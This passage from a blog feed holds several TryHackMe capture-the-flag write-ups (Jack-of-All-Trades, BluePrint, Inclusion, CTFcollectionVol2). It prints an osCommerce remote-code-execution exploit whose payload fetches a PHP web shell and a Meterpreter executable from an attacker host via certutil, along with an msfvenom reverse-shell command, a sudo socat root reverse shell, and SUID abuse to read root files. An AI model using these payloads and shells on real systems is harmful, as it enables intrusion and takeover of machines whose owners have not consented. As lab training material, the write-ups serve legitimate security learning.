[WARNING] Writing restore file because 1 final worker threads did not complete until end.
[ERROR] 1 target did not resolve or could not be connected
[ERROR] 0 targets did not complete
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2020-04-12 15:07:09
root@kali:~#&lt;/code&gt;&lt;/pre&gt;&lt;pre&gt;&lt;code&gt;root@kali:~# ssh jack@10.10.68.189 -p 80
jack@10.10.68.189's password: 
jack@jack-of-all-trades:~$ ls
user.jpg
jack@jack-of-all-trades:~$ python -m SimpleHTTPServer 8080
Serving HTTP on 0.0.0.0 port 8080 ...&lt;/code&gt;&lt;/pre&gt;&lt;figure class="kg-card kg-image-card kg-card-hascaption"&gt;&lt;img src="http://localhost:2368/content/images/2020/04/Screenshot-2020-04-12-at-16.10.53.png" class="kg-image" alt="Jack-of-All-Trades TryHackMe | write-up"&gt;&lt;figcaption&gt;User flag&lt;/figcaption&gt;&lt;/figure&gt;&lt;blockquote&gt;Privilege escalation&lt;/blockquote&gt;&lt;figure class="kg-card kg-code-card"&gt;&lt;pre&gt;&lt;code&gt;jack@jack-of-all-trades:~$ find / -perm -u=s -type f 2&amp;gt;/dev/null
/usr/lib/openssh/ssh-keysign
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/pt_chown
/usr/bin/chsh
/usr/bin/at
/usr/bin/chfn
/usr/bin/newgrp
/usr/bin/strings
/usr/bin/sudo
/usr/bin/passwd
/usr/bin/gpasswd
/usr/bin/procmail
/usr/sbin/exim4
/bin/mount
/bin/umount
/bin/su
jack@jack-of-all-trades:~$ &lt;/code&gt;&lt;/pre&gt;&lt;figcaption&gt;&lt;strong&gt;/usr/bin/strings 👌&lt;/strong&gt;&lt;/figcaption&gt;&lt;/figure&gt;&lt;p&gt;if you are not familiar with is strings command, it return each string of printable characters in files, you can familiarize yourself more by reading strings manual in Linux &lt;strong&gt;"man strings"&lt;/strong&gt;&lt;/p&gt;&lt;pre&gt;&lt;code&gt;jack@jack-of-all-trades:~$ /usr/bin/strings /root/root.txt
ToDo:
1.Get new penguin skin rug -- surely they won't miss one or two of those blasted creatures?
2.Make T-Rex model!
3.Meet up with Johny for a pint or two
4.Move the body from the garage, maybe my old buddy Bill from the force can help me hide her?
5.Remember to finish that contract for Lisa.
6.Delete this: securi-tay2020_{********************************}
jack@jack-of-all-trades:~$&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;And we have the root flag! Happy hacking!&lt;/p&gt;&lt;figure class="kg-card kg-bookmark-card"&gt;&lt;a class="kg-bookmark-container" href="https://blog.christoffer.online/2012-02-20-how-to-remove-firefoxs-this-address-is-restricted/"&gt;&lt;div class="kg-bookmark-content"&gt;&lt;div class="kg-bookmark-title"&gt;How to remove Firefox’s “This address is restricted”, commonly triggered by trying to access port 87 - blog.christoffer.online&lt;/div&gt;&lt;div class="kg-bookmark-description"&gt;How to remove Firefox’s “This address is restricted”, commonly triggered by trying to access port 87&lt;/div&gt;&lt;div class="kg-bookmark-metadata"&gt;&lt;span class="kg-bookmark-author"&gt;Christoffer Pettersson&lt;/span&gt;&lt;span class="kg-bookmark-publisher"&gt;blog.christoffer.online&lt;/span&gt;&lt;/div&gt;&lt;/div&gt;&lt;div class="kg-bookmark-thumbnail"&gt;&lt;img src="https://blog.christoffer.online/2012-02-20-how-to-remove-firefoxs-this-address-is-restricted/this_address_is_restricted.png" alt="Jack-of-All-Trades TryHackMe | write-up"&gt;&lt;/div&gt;&lt;/a&gt;&lt;/figure&gt;</content:encoded></item><item><title>BluePrint TryHackMe | write-up</title><description>&lt;p&gt;Hello everyone, today's challenge is really fun! rated as easy, and we get no hints or instruction, only one question as a note:&lt;/p&gt;&lt;p&gt;	 &lt;strong&gt;"Do you have what is takes to hack into this Windows Machine?"&lt;/strong&gt;&lt;/p&gt;&lt;blockquote&gt;ENUMERATION TIME&lt;/blockquote&gt;&lt;pre&gt;&lt;code&gt;root@kali:~# nmap -sC -sV 10.10.41.176
Starting Nmap 7.80&lt;/code&gt;&lt;/pre&gt;</description><link>http://localhost:2368/blueprint-tryhackme-write-up/</link><guid isPermaLink="false">5e91be87387469077d4030e9</guid><dc:creator>fr33s0ul</dc:creator><pubDate>Sat, 11 Apr 2020 13:09:40 GMT</pubDate><media:content url="http://localhost:2368/content/images/2020/04/blueprint.jpg" medium="image"/><content:encoded>&lt;img src="http://localhost:2368/content/images/2020/04/blueprint.jpg" alt="BluePrint TryHackMe | write-up"&gt;&lt;p&gt;Hello everyone, today's challenge is really fun! rated as easy, and we get no hints or instruction, only one question as a note:&lt;/p&gt;&lt;p&gt;	 &lt;strong&gt;"Do you have what is takes to hack into this Windows Machine?"&lt;/strong&gt;&lt;/p&gt;&lt;blockquote&gt;ENUMERATION TIME&lt;/blockquote&gt;&lt;pre&gt;&lt;code&gt;root@kali:~# nmap -sC -sV 10.10.41.176
Starting Nmap 7.80 ( https://nmap.org ) at 2020-04-11 12:43 UTC
Nmap scan report for ip-10-10-41-176.eu-west-1.compute.internal (10.10.41.176)
Host is up (0.00042s latency).
Not shown: 991 closed ports
PORT      STATE SERVICE     VERSION
135/tcp   open  msrpc       Microsoft Windows RPC
139/tcp   open  netbios-ssn Windows 7 Home Basic 7601 Service Pack 1 netbios-ssn
443/tcp   open  ssl/http    Apache httpd 2.4.23 (OpenSSL/1.0.2h PHP/5.6.28)
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Apache/2.4.23 (Win32) OpenSSL/1.0.2h PHP/5.6.28
|_http-title: Index of /
| ssl-cert: Subject: commonName=localhost
| Not valid before: 2009-11-10T23:48:47
|_Not valid after:  2019-11-08T23:48:47
|_ssl-date: TLS randomness does not represent time
| tls-alpn: 
|_  http/1.1
3306/tcp  open  mysql       MariaDB (unauthorized)
8080/tcp  open  http        Apache httpd 2.4.23 (OpenSSL/1.0.2h PHP/5.6.28)
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Apache/2.4.23 (Win32) OpenSSL/1.0.2h PHP/5.6.28
|_http-title: Index of /
49152/tcp open  msrpc       Microsoft Windows RPC
49153/tcp open  msrpc       Microsoft Windows RPC
49154/tcp open  msrpc       Microsoft Windows RPC
49158/tcp open  msrpc       Microsoft Windows RPC
MAC Address: 02:B2:F0:03:D8:00 (Unknown)
Service Info: Hosts: www.example.com, localhost; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: -19m59s, deviation: 34m37s, median: 0s
|_nbstat: NetBIOS name: BLUEPRINT, NetBIOS user: &amp;lt;unknown&amp;gt;, NetBIOS MAC: 02:b2:f0:03:d8:00 (unknown)
| smb-os-discovery: 
|   OS: Windows 7 Home Basic 7601 Service Pack 1 (Windows 7 Home Basic 6.1)
|   OS CPE: cpe:/o:microsoft:windows_7::sp1
|   Computer name: BLUEPRINT
|   NetBIOS computer name: BLUEPRINT\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2020-04-11T13:44:15+01:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2020-04-11T12:44:16
|_  start_date: 2020-04-11T12:43:15

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 72.89 seconds
root@kali:~# 
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;we have a lot of ports open, the most attractive one for more recon is port 8080&lt;/p&gt;&lt;figure class="kg-card kg-image-card kg-card-hascaption"&gt;&lt;img src="http://localhost:2368/content/images/2020/04/Screenshot-2020-04-11-at-13.58.59.png" class="kg-image" alt="BluePrint TryHackMe | write-up"&gt;&lt;figcaption&gt;we can see that it's hosting a oscommerce-2.3.4&lt;/figcaption&gt;&lt;/figure&gt;&lt;figure class="kg-card kg-image-card"&gt;&lt;img src="http://localhost:2368/content/images/2020/04/Screenshot-2020-04-11-at-14.07.20.png" class="kg-image" alt="BluePrint TryHackMe | write-up"&gt;&lt;/figure&gt;&lt;p&gt;diving in the directory we found, leads us to this ugly e-shopping website, next thing we need to do, accumulate data about the version of the oscommerce and examine if it's vulnerable to anything.&lt;/p&gt;&lt;figure class="kg-card kg-image-card kg-card-hascaption"&gt;&lt;img src="http://localhost:2368/content/images/2020/04/Screenshot-2020-04-11-at-16.06.30.png" class="kg-image" alt="BluePrint TryHackMe | write-up"&gt;&lt;figcaption&gt;and we have some goodies over here, went through each one and the RCE one seems compatible with our target and well documented&lt;/figcaption&gt;&lt;/figure&gt;&lt;figure class="kg-card kg-image-card"&gt;&lt;img src="http://localhost:2368/content/images/2020/04/Screenshot-2020-04-11-at-14.07.30.png" class="kg-image" alt="BluePrint TryHackMe | write-up"&gt;&lt;/figure&gt;&lt;p&gt;the exploit is written with python, we modified the script with the target we have and the specific port, the directory of the exploitable &lt;strong&gt;install.php&lt;/strong&gt; should be the same, or it won't work, here exactly where fundamentals in coding are really important, it helps a lot following the exploit which leads to understanding why exactly it is exploitable and with that knowledge, you can modify or even create you own script write it in bash or any preferable language ... I suggest for anyone just starting in the field to gain some coding skills.&lt;/p&gt;&lt;figure class="kg-card kg-code-card"&gt;&lt;pre&gt;&lt;code class="language-python"&gt;import requests

# enter the the target url here, as well as the url to the install.php (Do NOT remove the ?step=4)
base_url = "http://10.10.41.176:8080/oscommerce-2.3.4/catalog/"
target_url = "http://10.10.41.176:8080/oscommerce-2.3.4/catalog/install/install.php?step=4"

data = {
    'DIR_FS_DOCUMENT_ROOT': './'
}

# the payload will be injected into the configuration file via this code
# '  define(\'DB_DATABASE\', \'' . trim($HTTP_POST_VARS['DB_DATABASE']) . '\');' . "\n" .
# so the format for the exploit will be: '); PAYLOAD; /*

payload = '\');'
payload += '$var = shell_exec("cmd.exe /C certutil -urlcache -split -f http://10.10.75.213/shell.php shell.php");'
payload += 'echo $var;'
payload += '/*'


data['DB_DATABASE'] = payload

# exploit it
r = requests.post(url=target_url, data=data)

if r.status_code == 200:
    print("[+] Successfully launched the exploit. Open the following URL to execute your code\n\n" + base_url + "install/includes/configure.php")
else:
    print("[-] Exploit did not execute as planned")&lt;/code&gt;&lt;/pre&gt;&lt;figcaption&gt;shell.php contains | &amp;lt;?php $cmd=$_GET['cmd']; system($cmd);?&amp;gt;&lt;/figcaption&gt;&lt;/figure&gt;&lt;p&gt;The first thing I started with is uploading a simple shell.php code that holds a system() function call, and it executes the given command from the variable $cmd run it, and push back the output pretty simple and powerful.&lt;/p&gt;&lt;p&gt;running the file &lt;strong&gt;configure.php&lt;/strong&gt; in the directory &lt;strong&gt;/oscommerce-2.3.4/catalog/install/inclues/&lt;/strong&gt; will execute our pushed payload and upload our shell&lt;/p&gt;&lt;figure class="kg-card kg-image-card kg-card-hascaption"&gt;&lt;img src="http://localhost:2368/content/images/2020/04/Screenshot-2020-04-11-at-15.03.44.png" class="kg-image" alt="BluePrint TryHackMe | write-up"&gt;&lt;figcaption&gt;I use python to create a simple server to share files.&lt;/figcaption&gt;&lt;/figure&gt;&lt;figure class="kg-card kg-image-card"&gt;&lt;img src="http://localhost:2368/content/images/2020/04/Screenshot-2020-04-11-at-15.03.34.png" class="kg-image" alt="BluePrint TryHackMe | write-up"&gt;&lt;/figure&gt;&lt;p&gt;I ran the command whoami, we are NT AUTHORITY\SYSTEM aka Administrator&lt;/p&gt;&lt;!--kg-card-begin: html--&gt;&lt;iframe src="https://giphy.com/embed/3q7cjJmyZv7lS" width="480" height="362" frameborder="0" class="giphy-embed" allowfullscreen&gt;&lt;/iframe&gt;&lt;p&gt;&lt;a href="https://giphy.com/gifs/admin-nowadays-3q7cjJmyZv7lS"&gt;&lt;/a&gt;&lt;/p&gt;&lt;!--kg-card-end: html--&gt;&lt;p&gt;Next, I got my msfconsole ready setting the payload as a windows meterpreter reverse shell tcp, then set my localhost address and my local preferred port and commenced the listener, and without forgetting our reverse shell by itself.&lt;/p&gt;&lt;pre&gt;&lt;code&gt;msfvenom -p windows/meterpreter/reverse_tcp lhost=[LOCAL ADDRESS] lport=[PORT] -f exe &amp;gt; Service_system_update.exe&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;the python exploit that we got from exploit-db, needs to be adjusted again, I modified the payload variable, run the script and the &lt;strong&gt;configure.php&lt;/strong&gt; file from the includes directory.&lt;/p&gt;&lt;pre&gt;&lt;code&gt;payload = '\');'
payload += '$var = shell_exec("cmd.exe /C certutil -urlcache -split -f http://10.10.75.213/Service_system_update.exe Service_system_update.exe");'
payload += 'echo $var;'
payload += '/*'&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;/p&gt;&lt;figure class="kg-card kg-image-card"&gt;&lt;img src="http://localhost:2368/content/images/2020/04/Screenshot-2020-04-11-at-15.11.48.png" class="kg-image" alt="BluePrint TryHackMe | write-up"&gt;&lt;/figure&gt;&lt;figure class="kg-card kg-image-card"&gt;&lt;img src="http://localhost:2368/content/images/2020/04/Screenshot-2020-04-11-at-15.12.58.png" class="kg-image" alt="BluePrint TryHackMe | write-up"&gt;&lt;/figure&gt;&lt;p&gt;to answer your flag questioner all you have to do is hashdump for users hash keys, and decrypt the &lt;strong&gt;NTLM&lt;/strong&gt; hash of the user Lab, the password is very common you can decrypt it just in &lt;strong&gt;crackstation.net&lt;/strong&gt;, and there's a root.txt.txt file in the Desktop of the user Administrator carrying the root flag.&lt;/p&gt;&lt;p&gt;Happy Hacking!&lt;/p&gt;&lt;figure class="kg-card kg-bookmark-card"&gt;&lt;a class="kg-bookmark-container" href="https://crackstation.net/"&gt;&lt;div class="kg-bookmark-content"&gt;&lt;div class="kg-bookmark-title"&gt;CrackStation - Online Password Hash Cracking - MD5, SHA1, Linux, Rainbow Tables, etc.&lt;/div&gt;&lt;div class="kg-bookmark-description"&gt;Crackstation is the most effective hash cracking service. We crack: MD5, SHA1, SHA2, WPA, and much more...&lt;/div&gt;&lt;div class="kg-bookmark-metadata"&gt;&lt;span class="kg-bookmark-publisher"&gt;MD5, SHA1, Linux, Rainbow Tables, etc.&lt;/span&gt;&lt;/div&gt;&lt;/div&gt;&lt;div class="kg-bookmark-thumbnail"&gt;&lt;img src="https://crackstation.net/images/1by1.gif" alt="BluePrint TryHackMe | write-up"&gt;&lt;/div&gt;&lt;/a&gt;&lt;/figure&gt;&lt;figure class="kg-card kg-bookmark-card"&gt;&lt;a class="kg-bookmark-container" href="https://www.exploit-db.com/exploits/44374"&gt;&lt;div class="kg-bookmark-content"&gt;&lt;div class="kg-bookmark-title"&gt;osCommerce 2.3.4.1 - Remote Code Execution&lt;/div&gt;&lt;div class="kg-bookmark-description"&gt;osCommerce 2.3.4.1 - Remote Code Execution.. webapps exploit for PHP platform&lt;/div&gt;&lt;div class="kg-bookmark-metadata"&gt;&lt;img class="kg-bookmark-icon" src="https://www.exploit-db.com/favicon.ico" alt="BluePrint TryHackMe | write-up"&gt;&lt;span class="kg-bookmark-author"&gt;Simon Scannell&lt;/span&gt;&lt;span class="kg-bookmark-publisher"&gt;Exploit Database&lt;/span&gt;&lt;/div&gt;&lt;/div&gt;&lt;div class="kg-bookmark-thumbnail"&gt;&lt;img src="https://www.exploit-db.com/images/spider-orange.png" alt="BluePrint TryHackMe | write-up"&gt;&lt;/div&gt;&lt;/a&gt;&lt;/figure&gt;</content:encoded></item><item><title>Inclusion | CTF write-up</title><description>&lt;p&gt;today's CTF is really easy, and really recommend it for beginners to CTFs, let's go straight to it&lt;/p&gt;&lt;p&gt;&lt;strong&gt;ENUMERATION!&lt;/strong&gt;&lt;/p&gt;&lt;!--kg-card-begin: html--&gt;&lt;iframe src="https://giphy.com/embed/Za2fXikif3b9e" width="451" height="480" frameborder="0" class="giphy-embed" allowfullscreen&gt;&lt;/iframe&gt;&lt;p&gt;&lt;a href="https://giphy.com/gifs/hell-yeah-Za2fXikif3b9e"&gt;&lt;/a&gt;&lt;/p&gt;&lt;!--kg-card-end: html--&gt;&lt;pre&gt;&lt;code&gt;root@kali:~# nmap -sC -sV 10.10.94.6
Starting Nmap 7.80 ( https://nmap.org ) at 2020-04-10 14:38 UTC
Nmap scan report for ip-10-10-94-6.eu-west-1.compute.internal (10.10.&lt;/code&gt;&lt;/pre&gt;</description><link>http://localhost:2368/inclusion-ctf-write-up/</link><guid isPermaLink="false">5e9086505e61514e230adcb9</guid><dc:creator>fr33s0ul</dc:creator><pubDate>Fri, 10 Apr 2020 14:45:16 GMT</pubDate><media:content url="http://localhost:2368/content/images/2020/04/cdsczxcasdasdqw.png" medium="image"/><content:encoded>&lt;img src="http://localhost:2368/content/images/2020/04/cdsczxcasdasdqw.png" alt="Inclusion | CTF write-up"&gt;&lt;p&gt;today's CTF is really easy, and really recommend it for beginners to CTFs, let's go straight to it&lt;/p&gt;&lt;p&gt;&lt;strong&gt;ENUMERATION!&lt;/strong&gt;&lt;/p&gt;&lt;!--kg-card-begin: html--&gt;&lt;iframe src="https://giphy.com/embed/Za2fXikif3b9e" width="451" height="480" frameborder="0" class="giphy-embed" allowfullscreen&gt;&lt;/iframe&gt;&lt;p&gt;&lt;a href="https://giphy.com/gifs/hell-yeah-Za2fXikif3b9e"&gt;&lt;/a&gt;&lt;/p&gt;&lt;!--kg-card-end: html--&gt;&lt;pre&gt;&lt;code&gt;root@kali:~# nmap -sC -sV 10.10.94.6
Starting Nmap 7.80 ( https://nmap.org ) at 2020-04-10 14:38 UTC
Nmap scan report for ip-10-10-94-6.eu-west-1.compute.internal (10.10.94.6)
Host is up (0.0014s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 e6:3a:2e:37:2b:35:fb:47:ca:90:30:d2:14:1c:6c:50 (RSA)
|   256 73:1d:17:93:80:31:4f:8a:d5:71:cb:ba:70:63:38:04 (ECDSA)
|_  256 d3:52:31:e8:78:1b:a6:84:db:9b:23:86:f0:1f:31:2a (ED25519)
80/tcp open  http    Werkzeug httpd 0.16.0 (Python 3.6.9)
|_http-title: My blog
MAC Address: 02:13:CE:65:8B:84 (Unknown)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 7.02 seconds
root@kali:~#&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;We have two ports open 22 for SSH and 80 for HTTP running under python, which I think running django ... anyways! &lt;/p&gt;&lt;figure class="kg-card kg-image-card kg-card-hascaption"&gt;&lt;img src="http://localhost:2368/content/images/2020/04/Screenshot-2020-04-10-at-16.00.48.png" class="kg-image" alt="Inclusion | CTF write-up"&gt;&lt;figcaption&gt;ow look at that LFI-attack!&lt;/figcaption&gt;&lt;/figure&gt;&lt;figure class="kg-card kg-image-card kg-card-hascaption"&gt;&lt;img src="http://localhost:2368/content/images/2020/04/Screenshot-2020-04-10-at-15.40.22.png" class="kg-image" alt="Inclusion | CTF write-up"&gt;&lt;figcaption&gt;ok&lt;/figcaption&gt;&lt;/figure&gt;&lt;p&gt;and we have the /etc/passwd and a clear password for our user down there ...&lt;/p&gt;&lt;pre&gt;&lt;code&gt;root@kali:~# ssh falconfeast@10.10.94.6
The authenticity of host '10.10.94.6 (10.10.94.6)' can't be established.
ECDSA key fingerprint is SHA256:VRi7CZbTMsqjwnWmH2UVPWrLVIZzG4BQ9J6X+tVsuEQ.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.94.6' (ECDSA) to the list of known hosts.
falconfeast@10.10.94.6's password: 
Welcome to Ubuntu 18.04.3 LTS (GNU/Linux 4.15.0-74-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Fri Apr 10 20:13:54 IST 2020

  System load:  0.42              Processes:           87
  Usage of /:   34.9% of 9.78GB   Users logged in:     0
  Memory usage: 32%               IP address for eth0: 10.10.94.6
  Swap usage:   0%


 * Canonical Livepatch is available for installation.
   - Reduce system reboots and improve kernel security. Activate at:
     https://ubuntu.com/livepatch

3 packages can be updated.
3 updates are security updates.


Last login: Thu Jan 23 18:41:39 2020 from 192.168.1.107
falconfeast@inclusion:~$ sudo -l
Matching Defaults entries for falconfeast on inclusion:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User falconfeast may run the following commands on inclusion:
    (root) NOPASSWD: /usr/bin/socat
falconfeast@inclusion:~$&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;we are user falconfeast ! and we have a NOPASSWD SUDO FOR SOCAT .... speaking of socat, there's a PoC in &lt;strong&gt;GTFObins&lt;/strong&gt;, I really recommend checking the website it does have a lot of good knowledge.&lt;/p&gt;&lt;figure class="kg-card kg-image-card"&gt;&lt;img src="http://localhost:2368/content/images/2020/04/Screenshot-2020-04-10-at-15.46.56.png" class="kg-image" alt="Inclusion | CTF write-up"&gt;&lt;/figure&gt;&lt;pre&gt;&lt;code&gt;root@kali:~# socat file:`tty`,raw,echo=0 tcp-listen:5151
&lt;/code&gt;&lt;/pre&gt;&lt;pre&gt;&lt;code&gt;falconfeast@inclusion:~$ sudo -l
Matching Defaults entries for falconfeast on inclusion:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User falconfeast may run the following commands on inclusion:
    (root) NOPASSWD: /usr/bin/socat
falconfeast@inclusion:~$ RHOST=10.10.95.247
falconfeast@inclusion:~$ RPORT=5151
falconfeast@inclusion:~$ sudo /usr/bin/socat tcp-connect:$RHOST:$RPORT exec:sh,pty,stderr,setsid,sigint,sane

&lt;/code&gt;&lt;/pre&gt;&lt;pre&gt;&lt;code&gt;root@kali:~# socat file:`tty`,raw,echo=0 tcp-listen:5151
sh: 0: can't access tty; job control turned off                                     
# id                                                                                
uid=0(root) gid=0(root) groups=0(root)
# 
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;and that's it here, go get your flags! &lt;/p&gt;&lt;!--kg-card-begin: html--&gt;&lt;iframe src="https://giphy.com/embed/qyIKyAdelGPYI" width="480" height="305" frameborder="0" class="giphy-embed" allowfullscreen&gt;&lt;/iframe&gt;&lt;p&gt;&lt;a href="https://giphy.com/gifs/this-is-our-youth-qyIKyAdelGPYI"&gt;&lt;/a&gt;&lt;/p&gt;&lt;!--kg-card-end: html--&gt;&lt;p&gt;Happy Hacking!&lt;/p&gt;</content:encoded></item><item><title>CTFcollectionVol2 | write-up</title><description>&lt;p&gt;Hello everyone, today's CTF is the second part of a first one, it doesn't mean you need to do the first one to pass to the second.&lt;br&gt;this CTF is rated as a medium when it comes to difficulty, but trust me it doesn't matter. less talking more doing ... let's&lt;/p&gt;</description><link>http://localhost:2368/ctfcollectionvol2-write-up/</link><guid isPermaLink="false">5e8f196e5e61514e230adc53</guid><dc:creator>fr33s0ul</dc:creator><pubDate>Thu, 09 Apr 2020 13:28:55 GMT</pubDate><media:content url="http://localhost:2368/content/images/2020/04/holida-1.png" medium="image"/><content:encoded>&lt;img src="http://localhost:2368/content/images/2020/04/holida-1.png" alt="CTFcollectionVol2 | write-up"&gt;&lt;p&gt;Hello everyone, today's CTF is the second part of a first one, it doesn't mean you need to do the first one to pass to the second.&lt;br&gt;this CTF is rated as a medium when it comes to difficulty, but trust me it doesn't matter. less talking more doing ... let's start with some recon.&lt;/p&gt;&lt;pre&gt;&lt;code&gt;root@kali:~# nmap -sC -sV 10.10.194.62
Starting Nmap 7.80 ( https://nmap.org ) at 2020-04-09 12:45 UTC
Nmap scan report for ip-10-10-194-62.eu-west-1.compute.internal (10.10.194.62)
Host is up (0.00091s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 5.9p1 Debian 5ubuntu1.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   1024 1b:c2:b6:2d:fb:32:cc:11:68:61:ab:31:5b:45:5c:f4 (DSA)
|   2048 8d:88:65:9d:31:ff:b4:62:f9:28:f2:7d:42:07:89:58 (RSA)
|_  256 40:2e:b0:ed:2a:5a:9d:83:6a:6e:59:31:db:09:4c:cb (ECDSA)
80/tcp open  http    Apache httpd 2.2.22 ((Ubuntu))
| http-robots.txt: 1 disallowed entry 
|_/VlNCcElFSWdTQ0JKSUVZZ1dTQm5JR1VnYVNCQ0lGUWdTU0JFSUVrZ1p5QldJR2tnUWlCNklFa2dSaUJuSUdjZ1RTQjVJRUlnVHlCSklFY2dkeUJuSUZjZ1V5QkJJSG9nU1NCRklHOGdaeUJpSUVNZ1FpQnJJRWtnUlNCWklHY2dUeUJUSUVJZ2NDQkpJRVlnYXlCbklGY2dReUJDSUU4Z1NTQkhJSGNnUFElM0QlM0Q=
|_http-server-header: Apache/2.2.22 (Ubuntu)
|_http-title: 360 No Scope!
MAC Address: 02:9C:ED:08:6E:A4 (Unknown)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 12.16 seconds
root@kali:~# 
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;we have two ports open, the first one is 22 serving us SSH, the second one is 80 for HTTP running Apache, and I noticed something weird in the results, something that looks like a base64, but let us move on and discover what it is.&lt;/p&gt;&lt;figure class="kg-card kg-image-card kg-card-hascaption"&gt;&lt;img src="http://localhost:2368/content/images/2020/04/Screenshot-2020-04-09-at-13.51.58.png" class="kg-image" alt="CTFcollectionVol2 | write-up"&gt;&lt;figcaption&gt;&lt;strong&gt;Warning!!:The challenge contains seizure images and background. If you feeling uncomfortable, try removing the background on &amp;lt;style&amp;gt; tag&lt;/strong&gt;&lt;/figcaption&gt;&lt;/figure&gt;&lt;blockquote&gt;FLAG01&lt;/blockquote&gt;&lt;p&gt;The machine is designed to be exploited via the web to obtain the flags. From this point of view we use gobuster to get the directories, as always, we check the file &lt;code&gt;robots.txt&lt;/code&gt;where we see a hexadecimal string.&lt;/p&gt;&lt;pre&gt;&lt;code&gt;root@kali:~# gobuster dir -u http://10.10.194.62/ -w /usr/share/dirb/wordlists/common.txt 
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) &amp;amp; Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.194.62/
[+] Threads:        10
[+] Wordlist:       /usr/share/dirb/wordlists/common.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2020/04/09 13:06:41 Starting gobuster
===============================================================
/.htaccess (Status: 403)
/.htpasswd (Status: 403)
/.hta (Status: 403)
/button (Status: 200)
/cat (Status: 200)
/cgi-bin/ (Status: 403)
/iphone (Status: 200)
/index (Status: 200)
/index.php (Status: 200)
/login (Status: 301)
/robots (Status: 200)
/robots.txt (Status: 200)
/server-status (Status: 403)
/small (Status: 200)
/static (Status: 200)
/who (Status: 200)
===============================================================
2020/04/09 13:06:42 Finished
===============================================================
root@kali:~# 
&lt;/code&gt;&lt;/pre&gt;&lt;figure class="kg-card kg-image-card"&gt;&lt;img src="http://localhost:2368/content/images/2020/04/Screenshot-2020-04-10-at-17.10.47.png" class="kg-image" alt="CTFcollectionVol2 | write-up"&gt;&lt;/figure&gt;&lt;figure class="kg-card kg-image-card kg-card-hascaption"&gt;&lt;img src="http://localhost:2368/content/images/2020/04/Screenshot-2020-04-09-at-13.57.21.png" class="kg-image" alt="CTFcollectionVol2 | write-up"&gt;&lt;figcaption&gt;From Hex&lt;/figcaption&gt;&lt;/figure&gt;&lt;blockquote&gt;FLAG02&lt;/blockquote&gt;&lt;p&gt;We went back to the file robots.txt encore, where we see an encoded URL.&lt;/p&gt;&lt;figure class="kg-card kg-image-card"&gt;&lt;img src="http://localhost:2368/content/images/2020/04/Screenshot-2020-04-10-at-17.28.49.png" class="kg-image" alt="CTFcollectionVol2 | write-up"&gt;&lt;/figure&gt;&lt;figure class="kg-card kg-image-card"&gt;&lt;img src="http://localhost:2368/content/images/2020/04/Screenshot-2020-04-09-at-14.01.32.png" class="kg-image" alt="CTFcollectionVol2 | write-up"&gt;&lt;/figure&gt;&lt;pre&gt;&lt;code&gt;Base64 &amp;gt; URL decode &amp;gt; Base64 &amp;gt; "Remove spaces" &amp;gt; Base64 &amp;gt; "Remove spaces" &amp;gt; Base64&lt;/code&gt;&lt;/pre&gt;&lt;figure class="kg-card kg-image-card"&gt;&lt;img src="http://localhost:2368/content/images/2020/04/Screenshot-2020-04-09-at-14.01.46.png" class="kg-image" alt="CTFcollectionVol2 | write-up"&gt;&lt;/figure&gt;&lt;pre&gt;&lt;code&gt;&amp;lt;html&amp;gt;
	&amp;lt;head&amp;gt;
		&amp;lt;title&amp;gt; A slow clap for you&amp;lt;/title&amp;gt;
		&amp;lt;h1 style="text-align:center;"&amp;gt;A slow clap for you&amp;lt;/h1&amp;gt;
	&amp;lt;/head&amp;gt;
	
	&amp;lt;body&amp;gt;
	&amp;lt;p style="text-align:center;"&amp;gt;&amp;lt;img src="kim.png"/&amp;gt;&amp;lt;/p&amp;gt;
	&amp;lt;p style="text-align:center;"&amp;gt;Not bad, not bad.... papa give you a clap&amp;lt;/p&amp;gt;
	&amp;lt;p style="text-align:center;color:white;"&amp;gt;Easter 2: THM{f4ll3n_b453}&amp;lt;/p&amp;gt;
	&amp;lt;/body&amp;gt;

&amp;lt;/html&amp;gt;
